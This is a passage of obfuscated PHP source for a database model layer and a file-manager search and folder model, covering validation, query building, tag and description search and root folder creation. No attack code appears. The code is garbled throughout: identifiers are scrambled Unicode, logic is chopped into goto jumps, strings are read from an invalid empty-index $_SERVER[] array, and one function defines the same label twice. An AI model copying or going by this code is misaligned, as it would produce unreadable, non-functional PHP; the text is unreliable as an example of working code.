THINK_MODEL_INSERT); if (isset($this->options[$a[271]])) { $dɗ = $this->options[$a[271]]; unset($this->options[$a[271]]); } elseif ($cҎἚ == THINK_MODEL_INSERT && isset($this->insertFields)) { $dɗ = $this->insertFields; } elseif ($cҎἚ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $dɗ = $this->updateFields; } goto D錦ږ; f܇ڹ: $a =& $_SERVER[]; if (empty($C)) { $C = $_POST; } elseif (is_object($C)) { $C = get_object_vars($C); } if (empty($C) || !is_array($C)) { $this->error = think_lang($a[269]); return !1; } goto Aʱɬ; dč: } public function autoCheckToken($B) { $Bʅ =& $_SERVER[]; if (isset($this->options[$Bʅ[299]]) && !$this->options[$Bʅ[299]]) { return !0; } if (think_config($Bʅ[296])) { $c֔ = think_config($Bʅ[297]); if (!isset($B[$c֔]) || Session::get($c֔)) { return !1; } list($Cɑ, $FŖ) = explode($Bʅ[71], $B[$c֔]); if ($FŖ && Session::get($c֔ . $Bʅ[95] . $Cɑ) === $FŖ) { Session::remove($c֔ . $Bʅ[95] . $Cɑ); return !0; } if (think_config($Bʅ[300])) { Session::remove($c֔ . $Bʅ[95] . $Cɑ); } return !1; } return !0; } public function regex($D肎ì, $å) { $dͶ򓷫 =& $_SERVER[]; $EԳ = array($dͶ򓷫[301] => $dͶ򓷫[302], $dͶ򓷫[303] => $dͶ򓷫[304], $dͶ򓷫[305] => $dͶ򓷫[306], $dͶ򓷫[307] => $dͶ򓷫[308], $dͶ򓷫[309] => $dͶ򓷫[310], $dͶ򓷫[311] => $dͶ򓷫[312], $dͶ򓷫[313] => $dͶ򓷫[314], $dͶ򓷫[288] => $dͶ򓷫[315], $dͶ򓷫[316] => $dͶ򓷫[317]); if (isset($EԳ[strtolower($å)])) { $å = $EԳ[strtolower($å)]; } return preg_match($å, $D肎ì) === 1; } private function autoOperation(&$BӮ, $b¿҃) { $c =& $_SERVER[]; if (!empty($this->options[$c[318]])) { $a = $this->options[$c[318]]; unset($this->options[$c[318]]); } elseif (!empty($this->_auto)) { $a = $this->_auto; } if (isset($a)) { foreach ($a as $a) { if (empty($a[2])) { $a[2] = THINK_MODEL_INSERT; } if ($b¿҃ == $a[2] || $a[2] == THINK_MODEL_BOTH) { switch (trim($a[3])) { case $c[319]: case $c[320]: $F = isset($a[4]) ? (array) $a[4] : array(); if (isset($BӮ[$a[0]])) { array_unshift($F, $BӮ[$a[0]]); } if ($c[319] == $a[3]) { $BӮ[$a[0]] = call_user_func_array($a[1], $F); } else { $BӮ[$a[0]] = call_user_func_array(array(&$this, $a[1]), $F); } break; case $c[271]: $BӮ[$a[0]] = $BӮ[$a[1]]; break; case $c[321]: if ($c[33] === $BӮ[$a[0]]) { unset($BӮ[$a[0]]); } break; case $c[322]: default: $BӮ[$a[0]] = $a[1]; } if (!1 === $BӮ[$a[0]]) { unset($BӮ[$a[0]]); } } } } return $BӮ; } protected function autoValidation($Bǿ׎, $d) { $A忂 =& $_SERVER[]; if (!empty($this->options[$A忂[323]])) { $E疭 = $this->options[$A忂[323]]; unset($this->options[$A忂[323]]); } elseif (!empty($this->_validate)) { $E疭 = $this->_validate; } if (isset($E疭)) { if ($this->patchValidate) { $this->error = array(); } foreach ($E疭 as $Dލ => $eߛ) { if (empty($eߛ[5]) || $eߛ[5] == THINK_MODEL_BOTH || $eߛ[5] == $d) { if (0 == strpos($eߛ[2], $A忂[324]) && strpos($eߛ[2], $A忂[325])) { $eߛ[2] = think_lang(substr($eߛ[2], 2, -1)); } $eߛ[3] = isset($eߛ[3]) ? $eߛ[3] : THINK_EXISTS_VALIDATE; $eߛ[4] = isset($eߛ[4]) ? $eߛ[4] : $A忂[326]; switch ($eߛ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Bǿ׎, $eߛ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($A忂[33] != trim($Bǿ׎[$eߛ[0]])) { if (!1 === $this->_validationField($Bǿ׎, $eߛ)) { return !1; } } break; default: if (isset($Bǿ׎[$eߛ[0]])) { if (!1 === $this->_validationField($Bǿ׎, $eߛ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($A۶, $CͶ) { if (!1 === $this->_validationFieldItem($A۶, $CͶ)) { if ($this->patchValidate) { $this->error[$CͶ[0]] = $CͶ[2]; } else { $this->error = $CͶ[2]; return !1; } } return; } protected function _validationFieldItem($C╖, $D̍) { $A􎔋 =& $_SERVER[]; switch (strtolower(trim($D̍[4]))) { case $A􎔋[319]: case $A􎔋[320]: $f벹 = isset($D̍[6]) ? (array) $D̍[6] : array(); if (is_string($D̍[0]) && strpos($D̍[0], $A􎔋[47])) { $D̍[0] = explode($A􎔋[47], $D̍[0]); } if (is_array($D̍[0])) { foreach ($D̍[0] as $Fﵩ) { $b̈́[$Fﵩ] = $C╖[$Fﵩ]; } array_unshift($f벹, $b̈́); } else { array_unshift($f벹, $C╖[$D̍[0]]); } if ($A􎔋[319] == $D̍[4]) { return call_user_func_array($D̍[1], $f벹); } else { return call_user_func_array(array(&$this, $D̍[1]), $f벹); } case $A􎔋[327]: return $C╖[$D̍[0]] == $C╖[$D̍[1]]; case $A􎔋[328]: if (is_string($D̍[0]) && strpos($D̍[0], $A􎔋[47])) { $D̍[0] = explode($A􎔋[47], $D̍[0]); } $Fӈ = array(); if (is_array($D̍[0])) { foreach ($D̍[0] as $Fﵩ) { $Fӈ[$Fﵩ] = $C╖[$Fﵩ]; } } else { $Fӈ[$D̍[0]] = $C╖[$D̍[0]]; } if (!empty($C╖[$this->getPk()])) { $Fӈ[$this->getPk()] = array($A􎔋[329], $C╖[$this->getPk()]); } if ($this->where($Fӈ)->find()) { return !1; } return !0; default: return $this->check($C╖[$D̍[0]], $D̍[1], $D̍[4]); } } public function check($Cߪ, $b, $Eă = "\x72\x65\x67\x65\170") { $dט =& $_SERVER[]; $Eă = strtolower(trim($Eă)); switch ($Eă) { case $dט[7]: case $dט[330]: $A֊ = is_array($b) ? $b : explode($dט[47], $b); return $Eă == $dט[7] ? in_array($Cߪ, $A֊) : !in_array($Cߪ, $A֊); case $dט[331]: case $dט[332]: if (is_array($b)) { $A͙Ç = $b[0]; $f俽 = $b[1]; } else { list($A͙Ç, $f俽) = explode($dט[47], $b); } return $Eă == $dט[331] ? $Cߪ >= $A͙Ç && $Cߪ <= $f俽 : $Cߪ < $A͙Ç || $Cߪ > $f俽; case $dט[333]: case $dט[334]: return $Eă == $dט[333] ? $Cߪ == $b : $Cߪ != $b; case $dט[335]: $AҖ = mb_strlen($Cߪ, $dט[336]); if (strpos($b, $dט[47])) { list($A͙Ç, $f俽) = explode($dט[47], $b); return $AҖ >= $A͙Ç && $AҖ <= $f俽; } else { return $AҖ == $b; } case $dט[337]: list($C͒, $fśΜ) = explode($dט[47], $b); if (!is_numeric($C͒)) { $C͒ = strtotime($C͒); } if (!is_numeric($fśΜ)) { $fśΜ = strtotime($fśΜ); } return NOW_TIME >= $C͒ && NOW_TIME <= $fśΜ; case $dט[338]: return in_array(get_client_ip(), explode($dט[47], $b)); case $dט[339]: return !in_array(get_client_ip(), explode($dט[47], $b)); case $dט[326]: default: return $this->regex($Cߪ, $b); } } public function query($Dᨾ, $Bُ = false) { $fǇ =& $_SERVER[]; if (!is_bool($Bُ) && !is_array($Bُ)) { $Bُ = func_get_args(); array_shift($Bُ); } $Dᨾ = str_replace(array($fǇ[229], $fǇ[340]), $fǇ[50], $Dᨾ); $Dᨾ = $this->parseSql($Dᨾ, $Bُ); return $this->db->query($Dᨾ); } public function execute($Aِ, $eےŉ = false) { if (!is_bool($eےŉ) && !is_array($eےŉ)) { $eےŉ = func_get_args(); array_shift($eےŉ); } $Aِ = $this->parseSql($Aِ, $eےŉ); return $this->db->execute($Aِ); } protected function parseSql($Dн, $e) { $Cғ =& $_SERVER[]; if (!0 === $e) { $f͑ = $this->_parseOptions(); $Dн = $this->db->parseSql($Dн, $f͑); } elseif (is_array($e)) { $e = array_map(array($this->db, $Cғ[341]), $e); $Dн = vsprintf($Dн, $e); } else { $Dн = strtr($Dн, array($Cғ[342] => $this->getTableName(), $Cғ[343] => think_config($Cғ[242]))); } $this->db->setModel($this->name); return $Dн; } public function db($D֦ = '', $f = '', $F = array()) { goto b݂ɐ; dʎ: static $D = array(); if (!isset($D[$D֦]) || isset($D[$D֦]) && $f && $DΓ[$D֦] != $f) { if (!empty($f) && is_string($f) && !1 === strpos($f, $dѡӂڃ[8])) { $f = think_config($f); } $D[$D֦] = Db::getInstance($f); } elseif (NULL === $f) { $D[$D֦]->close(); unset($D[$D֦]); return; } if (!empty($F)) { if (is_string($F)) { parse_str($F, $F); } foreach ($F as $dأ => $B𴄭) { $this->setProperty($dأ, $B𴄭); } } goto EĽ׊; dؑ: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto f; EĽ׊: $DΓ[$D֦] = $f; $this->db = $D[$D֦]; $this->_after_db(); goto dؑ; b݂ɐ: $dѡӂڃ =& $_SERVER[]; if ($dѡӂڃ[33] === $D֦ && $this->db) { return $this->db; } static $DΓ = array(); goto dʎ; f: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $c͸ = get_class($this); if ($c͸ == $_SERVER[][344]) { return $this->name; } $this->name = substr($c͸, 0, -5); } return $this->name; } public function getTableName() { $bԢ =& $_SERVER[]; if (empty($this->trueTableName)) { $B = !empty($this->tablePrefix) ? $this->tablePrefix : $bԢ[33]; if (!empty($this->tableName)) { $B .= $this->tableName; } else { $B .= think_parse_name($this->name); } $this->trueTableName = strtolower($B); } return (!empty($this->dbName) ? $this->dbName . $bԢ[95] : $bԢ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $E =& $_SERVER[]; return isset($this->fields[$E[249]]) ? $this->fields[$E[249]] : $this->pk; } public function getDbFields() { $f霪 =& $_SERVER[]; if (isset($this->options[$f霪[277]])) { $bơ⑄ = $this->db->getFields($this->options[$f霪[277]]); return $bơ⑄ ? array_keys($bơ⑄) : !1; } if ($this->fields) { $bơ⑄ = $this->fields; unset($bơ⑄[$f霪[248]], $bơ⑄[$f霪[249]], $bơ⑄[$f霪[250]], $bơ⑄[$f霪[247]]); return $bơ⑄; } return !1; } public function data($b࣭ = '') { $F =& $_SERVER[]; if ($F[33] === $b࣭ && !empty($this->data)) { return $this->data; } if (is_object($b࣭)) { $b࣭ = get_object_vars($b࣭); } elseif (is_string($b࣭)) { parse_str($b࣭, $b࣭); } elseif (!is_array($b࣭)) { think_exception(think_lang($F[269])); } $this->data = $b࣭; return $this; } public function join($Dǉڐ) { $a =& $_SERVER[]; if (is_array($Dǉڐ)) { $this->options[$a[280]] = $Dǉڐ; } elseif (!empty($Dǉڐ)) { $this->options[$a[280]][] = $Dǉڐ; } return $this; } public function union($A, $DΪ = false) { goto f簳; f簳: $bٺ׊ =& $_SERVER[]; if (empty($A)) { return $this; } if ($DΪ) { $this->options[$bٺ׊[345]][$bٺ׊[346]] = !0; } goto bΑ; bΑ: if (is_object($A)) { $A = get_object_vars($A); } if (is_string($A)) { $Dɷ = $A; } elseif (is_array($A)) { if (isset($A[0])) { $this->options[$bٺ׊[345]] = array_merge($this->options[$bٺ׊[345]], $A); return $this; } else { $Dɷ = $A; } } else { think_exception(think_lang($bٺ׊[269])); } $this->options[$bٺ׊[345]][] = $Dɷ; goto dƥ; dƥ: return $this; goto a; a: } public function cache($FƐ = true, $aы = null, $CȂ֤ = '') { $D =& $_SERVER[]; if (!1 !== $FƐ) { $this->options[$D[347]] = array($D[93] => $FƐ, $D[337] => $aы, $D[29] => $CȂ֤); } return $this; } public function field($cܢ, $A = false) { $Dӻ =& $_SERVER[]; if (!0 === $cܢ) { $Dމǎ = $this->getDbFields(); $cܢ = $Dމǎ ? $Dމǎ : $Dӻ[182]; } elseif ($A) { if (is_string($cܢ)) { $cܢ = explode($Dӻ[47], $cܢ); } $Dމǎ = $this->getDbFields(); $cܢ = $Dމǎ ? array_diff($Dމǎ, $cܢ) : $cܢ; } $this->options[$Dӻ[271]] = $cܢ; return $this; } public function scope($b = '', $fڭ = NULL) { $f =& $_SERVER[]; if ($f[33] === $b) { if (isset($this->_scope[$f[34]])) { $Cߍ = $this->_scope[$f[34]]; } else { return $this; } } elseif (is_string($b)) { $e͆ = explode($f[47], $b); $Cߍ = array(); foreach ($e͆ as $e􇰆) { if (!isset($this->_scope[$e􇰆])) { continue; } $Cߍ = array_merge($Cߍ, $this->_scope[$e􇰆]); } if (!empty($fڭ) && is_array($fڭ)) { $Cߍ = array_merge($Cߍ, $fڭ); } } elseif (is_array($b)) { $Cߍ = $b; } if (is_array($Cߍ) && !empty($Cߍ)) { $this->options = array_merge($this->options, array_change_key_case($Cߍ)); } return $this; } public function where($Dُװͅ, $E = null) { $e =& $_SERVER[]; if (!is_null($E) && is_string($Dُװͅ)) { if (!is_array($E)) { $E = func_get_args(); array_shift($E); } $E = array_map(array($this->db, $e[341]), $E); $Dُװͅ = vsprintf($Dُװͅ, $E); } elseif (is_object($Dُװͅ)) { $Dُװͅ = get_object_vars($Dُװͅ); } elseif (is_array($Dُװͅ)) { foreach ($Dُװͅ as $b => $DŽն) { if ((is_numeric($b) || !$b) && is_string($DŽն)) { if (strpos($DŽն, $e[348]) === 0) { continue; } think_trace($e[349], $e[33], $e[46]); die; } } } if (is_string($Dُװͅ) && $e[33] != $Dُװͅ) { $fǋ = array(); $fǋ[$e[350]] = $Dُװͅ; $Dُװͅ = $fǋ; } if (isset($this->options[$e[273]])) { $this->options[$e[273]] = array_merge($this->options[$e[273]], $Dُװͅ); } else { $this->options[$e[273]] = $Dُװͅ; } return $this; } public function limit($Dʆӎ, $aõ = null) { $DȊ =& $_SERVER[]; $this->options[$DȊ[290]] = is_null($aõ) ? $Dʆӎ : $Dʆӎ . $DȊ[47] . $aõ; return $this; } public function page($Cꛂ, $B = null) { $b֗ =& $_SERVER[]; $this->options[$b֗[351]] = is_null($B) ? $Cꛂ : $Cꛂ . $b֗[47] . $B; return $this; } public function comment($c) { $this->options[$_SERVER[][352]] = $c; return $this; } public function setProperty($B, $a) { if (property_exists($this, $B)) { $this->{$B} = $a; } return $this; } } goto E; Bñ: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($f) { goto b; b: $aϑڈ =& $_SERVER[]; $e׽ = KodIO::fileTypeList(); $F貓 = $e׽[$f]; goto b鐸; a: if (!$F貓[$aϑڈ[168]]) { $eݗ㧺 = array_to_keyvalue($e׽, $aϑڈ[33], $aϑڈ[168]); $F = implode($aϑڈ[47], $eݗ㧺); $a = $aϑڈ[1941]; } $dҔú = explode($aϑڈ[47], trim($F, $aϑڈ[47])); return array($a, $dҔú); goto E弬Ǹ; b鐸: if (!$F貓) { return array(); } $F = $F貓[$aϑڈ[168]]; $a = $aϑڈ[7]; goto a; E弬Ǹ: } public function listPathType($F̞) { $c禞 =& $_SERVER[]; $cމ˞ = $this->fileTypeWhere($F̞); if (!$cމ˞) { return array(); } $D = array($c禞[562] => SourceModel::TYPE_USER, $c禞[563] => USER_ID, $c禞[559] => 0, $c禞[560] => $cމ˞); return $this->listSource($D); } public function listSearch($fڴ, $B򮡏 = 300) { goto AԶ; d僳̈: $this->_listMake($Dο̃); return $Dο̃; goto cϰ; aɏ: $this->_listSearchBindPinyin($fڴ, $Aє, $aŰ鳻); $this->alias($EҧÖ[529])->_makeOrder(); $Aє = $this->parseWhereLike($Aє); goto Fȫ; Fȫ: $Dο̃ = $this->distinct(!0)->field($aŰ鳻)->where($Aє)->selectPage($B򮡏); $this->_listSearchFileContent($Dο̃, $fڴ, $d氿); $this->_listSearchDesc($Dο̃, $fڴ, $d氿); goto aďǟ; Eݣ: if (!isset($Aє[$EҧÖ[423]])) { $Aє[$EҧÖ[423]] = 0; } $aŰ鳻 = $EҧÖ[1943]; $d氿 = $aŰ鳻; goto aɏ; aďǟ: $this->_listSearchTag($Dο̃, $fڴ, $d氿); $this->_listSearchGroupTag($Dο̃, $fڴ, $d氿); $this->_listDataApply($Dο̃[$EҧÖ[367]]); goto d僳̈; AԶ: $EҧÖ =& $_SERVER[]; if (isset($fڴ[$EҧÖ[1785]]) && $fڴ[$EҧÖ[1785]]) { $fڴ[$EҧÖ[1785]] = str_replace($EҧÖ[381], $EҧÖ[1942], trim($fڴ[$EҧÖ[1785]])); } $Aє = $this->_parseSearchWhere($fڴ); goto Eݣ; cϰ: } private function _listSearchFileContent(&$aύ, $F, $cת) { goto bԔ; bԔ: $bņ =& $_SERVER[]; if (!$F[$bņ[1785]] || $aύ[$bņ[364]][$bņ[351]] > 1) { return; } $c = $this->_parseSearchWhere($F); goto e飜ω; e飜ω: if (!isset($c[$bņ[28]]) || !is_array($F[$bņ[447]])) { return; } $c[$bņ[447]] = array($bņ[7], $F[$bņ[447]]); unset($c[$bņ[28]]); goto B㼰; B㼰: unset($F[$bņ[447]]); $bչ = $this->field($cת)->where($c)->limit($bņ[1944])->select(); if (!$bչ || count($bչ) == 0) { return; } goto b֏ۄ; b֏ۄ: $aύ[$bņ[367]] = array_merge($bչ, $aύ[$bņ[367]]); $aύ[$bņ[364]][$bņ[365]] += count($bչ); goto cςơ; cςơ: } private function _listSearchTag(&$Cޡ퍲, $c, $Fʕ) { goto č㷲; BΤ: $Bſ = array(); $f㪳 = $c[$c[1785]]; foreach ($eΞ as $f՘犑) { $f = $f՘犑[$c[28]]; $F = str_replace($c[50], $c[33], Pinyin::encode($f)); if (stripos($f, $f㪳) !== !1 || stripos($F, $f㪳) !== !1) { $Bſ[] = $f՘犑[$c[393]]; } } goto e; č㷲: $c =& $_SERVER[]; if (!$c[$c[1785]] || $Cޡ퍲[$c[364]][$c[351]] > 1) { return; } $eΞ = Model($c[1945])->listData(); goto BΤ; Aڭڸ: $A׵ = array_to_keyvalue($A׵, $c[33], $c[76]); $B = array_unique($A׵); $this->_listSearchMerge($Cޡ퍲, $c, $Fʕ, $B); goto aꕣ; e: if (!$Bſ) { return; } $B = array($c[419] => array($c[7], $Bſ), $c[1533] => USER_ID); $A׵ = Model($c[420])->field($c[76])->where($B)->select(); goto Aڭڸ; aꕣ: } private function _listSearchDesc(&$e͋, $Aǽň, $C) { goto cУ; DӚ: $Cı = Model($Dܐ[545])->field($Dܐ[395])->where($bݏ)->select(); $Eî = array_to_keyvalue($Cı, $Dܐ[33], $Dܐ[395]); $this->_listSearchMerge($e͋, $Aǽň, $C, $Eî); goto C; cУ: $Dܐ =& $_SERVER[]; if (!$Aǽň[$Dܐ[1785]] || $e͋[$Dܐ[364]][$Dܐ[351]] > 1) { return; } $D = $this->listSearchChildren($Aǽň[$Dܐ[478]]); goto aƩ; aƩ: $D = array_unique($D); if (!$D) { return; } $bݏ = array($Dܐ[395] => array($Dܐ[7], $D), $Dܐ[93] => $Dܐ[431], $Dܐ[372] => array($Dܐ[380], $Dܐ[1787] . $Aǽň[$Dܐ[1785]] . $Dܐ[1787])); goto DӚ; C: } private function _listSearchGroupTag(&$D̛Љ, $dϘ, $C⥛) { goto d; Bâ: if (!$DǆȻ || $DǆȻ[$d߫[404]] != SourceModel::TYPE_GROUP) { return; } $aʊ = $DǆȻ[$d߫[484]]; $E = Model($d߫[1946])->get($aʊ); goto dռ; dռ: $D܂ = array(); $f͙ = $dϘ[$d߫[1785]]; foreach ($E[$d߫[367]] as $Cժ) { $A韨 = $Cժ[$d߫[28]]; $c댉 = str_replace($d߫[50], $d߫[33], Pinyin::encode($A韨)); if (stripos($A韨, $f͙) !== !1 || stripos($c댉, $f͙) !== !1) { $D܂[] = $Cժ[$d߫[393]]; } } goto d; Bᮝ: $Bӿ = array_to_keyvalue($Bӿ, $d߫[33], $d߫[76]); $f؊ = array_unique($Bӿ); $this->_listSearchMerge($D̛Љ, $dϘ, $C⥛, $f؊); goto e; d: if (!$D܂) { return; } $e = array($d߫[419] => array($d߫[7], $D܂), $d߫[1533] => 0, $d߫[29] => $d߫[1809] . $aʊ); $Bӿ = Model($d߫[420])->field($d߫[76])->where($e)->select(); goto Bᮝ; d: $d߫ =& $_SERVER[]; if (!$dϘ[$d߫[1785]] || $D̛Љ[$d߫[364]][$d߫[351]] > 1 || !$dϘ[$d߫[478]]) { return; } $DǆȻ = $this->sourceInfo($dϘ[$d߫[478]]); goto Bâ; e: } private function _listSearchMerge(&$aâ, $bͻ, $Eߛ, $bʨӤ) { goto aۿ; aۿ: $aڏ =& $_SERVER[]; if (!$bʨӤ) { return; } $fξ⠟ = array_to_keyvalue($aâ[$aڏ[367]], $aڏ[33], $aڏ[395]); goto d搤; e: foreach ($a as $AȽˍ) { if ($this->_listSearchFilter($AȽˍ, $bͻ)) { $c[] = $AȽˍ; } } $aâ[$aڏ[367]] = array_merge($c, $aâ[$aڏ[367]]); $aâ[$aڏ[364]][$aڏ[365]] += count($c); goto b; d搤: $E = array_diff($bʨӤ, $fξ⠟); if (!$E) { return; } $Aݍ = array($aڏ[395] => array($aڏ[7], $E)); goto cޝΫ; cޝΫ: $a = $this->field($Eߛ)->where($Aݍ)->select(); if (!$a) { return; } $c = array(); goto e; b: } private function _listSearchFilter($eՆ, $Aֆ󮝾) { goto a; c: if (isset($Aֆ󮝾[$cױ[575]]) && $Aֆ󮝾[$cױ[575]] != $eՆ[$cױ[434]]) { return !1; } return !0; goto Cʥ; Bތ: if (isset($Aֆ󮝾[$cױ[405]]) && $Aֆ󮝾[$cױ[405]] != $cױ[1752]) { if ($Aֆ󮝾[$cױ[405]] == $cױ[77] && !$Fۡ) { return !1; } if ($Aֆ󮝾[$cױ[405]] != $cױ[77] && $Fۡ) { return !1; } if (!strstr($eՆ[$cױ[168]], $cױ[47] . $Aֆ󮝾[$cױ[405]] . $cױ[47])) { return !1; } } if (isset($Aֆ󮝾[$cױ[1947]]) && $Aֆ󮝾[$cױ[1947]] < $eՆ[$cױ[78]]) { return !1; } if (isset($Aֆ󮝾[$cױ[1948]]) && $Aֆ󮝾[$cױ[1948]] > $eՆ[$cױ[78]]) { return !1; } goto c; a: $cױ =& $_SERVER[]; $Fۡ = $eՆ[$cױ[403]] == $cױ[87]; if (!strstr($eՆ[$cױ[502]], $cױ[47] . $Aֆ󮝾[$cױ[478]] . $cױ[47])) { return !1; } goto Bތ; Cʥ: } public function listSearchChildren($c༛, $C = 5000) { goto Aҏ; Bƪͭ: $d࡙ = $this->field($f䋅[395])->where($fʗ)->select(); $F = array_to_keyvalue($d࡙, $f䋅[33], $f䋅[395]); return $F; goto c; A͋: $fʗ = array($f䋅[502] => array($f䋅[380], $báݚ[$f䋅[502]] . $báݚ[$f䋅[395]] . $f䋅[526])); $Bԯڙ = $this->field($f䋅[395])->cache(null, 600)->where($fʗ)->count(); if ($Bԯڙ > $C) { return $this->_listSearchChildrenNear($c༛, $C); } goto Bƪͭ; Aҏ: $f䋅 =& $_SERVER[]; $F = array(); $báݚ = $this->sourceInfo($c༛); goto A͋; c: } private function _listSearchChildrenNear($bǏ, $fɝ) { goto aƆʨ; aƆʨ: $b =& $_SERVER[]; $eڼ = array(); $BӉ = array($b[478] => $bǏ); goto bݭڿ; A𭤪: if (!$d) { return $eڼ; } $BӉ = array($b[478] => array($b[7], $d)); $bφ = $this->field($b[1949])->where($BӉ)->limit($fɝ)->select(); goto F䠛; bݭڿ: $bφ = $this->field($b[1949])->where($BӉ)->select(); $d = array_to_keyvalue(array_filter_by_field($bφ, $b[403], $b[87]), $b[33], $b[395]); $eڼ = array_merge($eڼ, array_to_keyvalue($bφ, $b[33], $b[395])); goto A𭤪; F䠛: $eڼ = array_merge($eڼ, array_to_keyvalue($bφ, $b[33], $b[395])); $eڼ = array_slice($eڼ, 0, $fɝ); return $eڼ; goto EŘ; EŘ: } private function _listSearchBindPinyin($eǔ̕Ͱ, &$Eǘ, &$C͑) { goto C֤È; a˝: $Eǘ = $AӸ; goto FȲ䯃; e߷ɨ: foreach ($Eǘ as $E젻 => $eԶވ) { $AӸ[$b݈⍙[1951] . $E젻] = $eԶވ; } foreach ($d˗ as $Bז) { $AӸ[] = array($b݈⍙[1953] => $Bז, $b݈⍙[959] => $b݈⍙[1789], array($b݈⍙[1954] => $Bז, $b݈⍙[1955] => array($b݈⍙[7], array($b݈⍙[444], $b݈⍙[443])))); } $this->join($eٷΏ); goto a˝; D񔋄: $C͑ = $b݈⍙[1951] . str_replace($b݈⍙[47], $b݈⍙[1952], $C͑); $d˗ = $Eǘ[$b݈⍙[28]]; unset($Eǘ[$b݈⍙[28]]); goto e߷ɨ; EȊˑ: $eٷΏ = "\x4c\105\106\124\40\112\117\x49\116\40{$this->tablePrefix}\x69\157\137\x73\157\165\162\x63\x65\137\x6d\x65\x74\x61\40\x6d\x65\164\141\x20\157\x6e\x20\x73\x6f\x75\162\x63\145\x2e\163\x6f\x75\x72\143\145\x49\x44\x20\x3d\x20\155\x65\x74\x61\56\163\x6f\165\x72\143\145\111\x44"; $AӸ = array(); $C͑ = str_replace(array($b݈⍙[229], $b݈⍙[50], $b݈⍙[1950]), $b݈⍙[33], $C͑); goto D񔋄; C֤È: $b݈⍙ =& $_SERVER[]; if (!isset($eǔ̕Ͱ[$b݈⍙[1785]]) || !$eǔ̕Ͱ[$b݈⍙[1785]]) { return; } if (!Input::check($eǔ̕Ͱ[$b݈⍙[1785]], $b݈⍙[316]) || strlen($eǔ̕Ͱ[$b݈⍙[1785]]) < 2) { return; } goto EȊˑ; FȲ䯃: } private function _parseSearchWhere($Cތ) { goto aχ; aχ: $aل =& $_SERVER[]; $eؿ = array(); if (isset($Cތ[$aل[726]]) && $Cތ[$aل[726]]) { $eؿ[$aل[84]] = array($aل[1956], $Cތ[$aل[726]]); } goto a; e: if (isset($Cތ[$aل[1785]]) && trim($Cތ[$aل[1785]])) { $fߵ = trim($Cތ[$aل[1785]]); $B = explode($aل[50], $fߵ); if (strlen($fߵ) > 2 && (substr($fߵ, 0, 1) == $aل[116] && substr($fߵ, -1) == $aل[116]) || substr($fߵ, 0, 1) == $aل[55] && substr($fߵ, -1) == $aل[55]) { $fߵ = substr($fߵ, 1, -1); $B = array($fߵ); } $eؿ[$aل[28]] = array(array($aل[525], $aل[1787] . $fߵ . $aل[1787])); if (count($B) > 1) { $eؿ[$aل[28]] = array(); foreach ($B as $A) { if (!trim($A)) { continue; } $eؿ[$aل[28]][] = array($aل[525], $aل[1787] . trim($A) . $aل[1787]); } } } return $eؿ; goto bҧݒ; a: if (isset($Cތ[$aل[476]]) && $Cތ[$aل[476]]) { $fļ = array($aل[1957], $Cތ[$aل[476]]); if ($eؿ[$aل[84]]) { $eؿ[$aل[84]] = array($eؿ[$aل[84]], $fļ, $aل[1958]); } else { $eؿ[$aل[84]] = $fļ; } } if (isset($Cތ[$aل[1947]]) && $Cތ[$aل[1947]] > 0) { $eؿ[$aل[78]] = array($aل[1956], $Cތ[$aل[1947]]); } if (isset($Cތ[$aل[1948]]) && $Cތ[$aل[1948]]) { $fļ = array($aل[1957], $Cތ[$aل[1948]]); if ($eؿ[$aل[78]]) { $eؿ[$aل[78]] = array($eؿ[$aل[78]], $fļ, $aل[1958]); } else { $eؿ[$aل[78]] = $fļ; } } goto D; D: if (isset($Cތ[$aل[575]]) && $Cތ[$aل[575]]) { $eؿ[] = array($aل[434] => $Cތ[$aل[575]], $aل[432] => $Cތ[$aل[575]], $aل[959] => $aل[1789]); } if (isset($Cތ[$aل[405]]) && $Cތ[$aل[405]]) { $Bפ = $Cތ[$aل[405]]; if ($Bפ == $aل[77]) { $eؿ[$aل[403]] = 1; } else { if ($Bפ == $aل[1959]) { $eؿ[$aل[403]] = 0; } else { if ($Bפ) { $Bפ = is_array($Bפ) ? $Bפ : explode($aل[47], $Bפ); $eؿ[$aل[405]] = array($aل[411], $Bפ); $eؿ[$aل[403]] = 0; } } } } if (isset($Cތ[$aل[478]]) && $Cތ[$aل[478]]) { $e썝 = $this->sourceInfo($Cތ[$aل[478]]); $eؿ[$aل[566]] = array($aل[525], $e썝[$aل[502]] . $Cތ[$aل[478]] . $aل[526]); } goto e; bҧݒ: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($bʻ) { $e =& $_SERVER[]; $aۏհ = Model($e[494])->where(array($e[1524] => $bʻ))->find(); $fڛՔ = $this->_mkdirRoot(SourceModel::TYPE_USER, $bʻ, $aۏհ[$e[28]]); $this->userDesktopAdd($fڛՔ); return $fڛՔ; } public function userDesktopAdd($C㏛) { $B =& $_SERVER[]; $Bî = LNG($B[1960]); $Fكӕ = $this->mkdir($C㏛, $Bî); $this->metaSet($Fكӕ, $B[1961], $B[87]); $this->metaSet($C㏛, $B[1962], $Fكӕ); } public function groupRootAdd($e) { $f엤 =& $_SERVER[]; $C = Model($f엤[503])->where(array($f엤[1780] => $e))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $e, $C[$f엤[28]]); } public function systemRootPathAdd($B) { if ($B != $_SERVER[][518]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $B); } public function userRootRemove($dʎ) { $bЖ = $this->sourceRoot(SourceModel::TYPE_USER, $dʎ); if (!$bЖ) { return; } $this->remove($bЖ, !1); } public function groupRootRemove($aĆ) { $cǘô = $this->sourceRoot(SourceModel::TYPE_GROUP, $aĆ); if (!$cǘô) { return; } $this->remove($cǘô, !1); } private function _mkdirRoot($A, $D莰ܤʎ, $dЋ) { goto DЄَ; DЄَ: $Bꚟ =& 